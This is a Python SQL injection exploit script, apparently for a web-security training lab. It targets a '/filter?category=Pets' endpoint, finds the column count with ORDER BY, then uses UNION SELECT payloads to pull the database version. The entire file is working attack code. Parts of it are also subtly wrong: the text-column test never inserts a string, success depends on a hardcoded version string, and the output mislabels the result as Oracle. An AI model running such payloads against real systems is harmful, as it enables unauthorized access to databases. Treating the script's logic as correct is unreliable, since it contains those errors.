import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={'http':"http://127.0.0.1:8080",'https':"http://127.0.0.1:8080"}

def exploit_sqli_column_number(url):
    path='/filter?category=Pets' #change category in new lab
    for i in range(1,50):
        sql_payload="'+order+by+%s%%23" %i
        r=requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        res=r.text
        if "Internal Server Error" in res:
            return i-1
    return False

def exploit_sqli_string_field(url,num_col):
    path="/filter?category=Pets"
    for i in range(1,num_col+1):
        payload_list=['null'] * num_col
        sql_payload="' union select " + ','.join(payload_list)+"%23"
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        res=r.text
        if 'Internal Server Error' not in res:
            return i
    return False

def exploit_db_version(url,num_col,string_column):
    path='/filter?category=Pets'
    string="@@version" #change in new lab
    payload_list=['null'] * num_col
    payload_list[string_column]=string
    
    sql_payload="' union select " + ','.join(payload_list)+"%23"
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    res=r.text
    
    soup=BeautifulSoup(res,'html.parser')
    version=soup.find(string=re.compile('8.0.39-0ubuntu0.20.04.1'))
    if version in res:
        print('[+] SQL Injection Successful')
        print('[+] The Oracle database version is: '+ version)
        return True
    return False



if __name__ == '__main__':
    try:
        url=sys.argv[1].strip()
    except IndexError:
        print('[-] Usage: %s <url>'%sys.argv[0])
        print('[-] Example: %s www.example.com'%sys.argv[0])
        sys.exit(-1)

    print("[+] Figuring out number of columns...")
    num_col=exploit_sqli_column_number(url)
    if num_col:
        print("[+] The number of columns is " + str(num_col)+'.')
        print("[+] figuring out which column contains text...")
        string_column=exploit_sqli_string_field(url,num_col)
        if string_column:
            print("[+] The column that cointais text is "+ str(string_column)+".")

            if not exploit_db_version(url,num_col,string_column):
                print('[-] SQL Injection Failed')
        else:
            print("[-] We were not able to find a column that has string data type.")
    else:
        print("[-] The SQLi attack was not successful.")